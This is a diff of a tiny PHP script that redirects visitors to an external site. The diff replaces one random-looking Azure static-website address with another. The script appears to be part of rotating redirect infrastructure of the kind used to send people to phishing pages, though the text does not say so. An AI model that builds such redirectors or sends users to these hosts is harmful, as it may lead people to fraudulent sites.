@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://filxx4giiil7ac15xixi.z5.web.core.windows.net/");
+header("Location: https://off4hcorr55core66ggxx.z1.web.core.windows.net/");
  
 exit;
 ?>
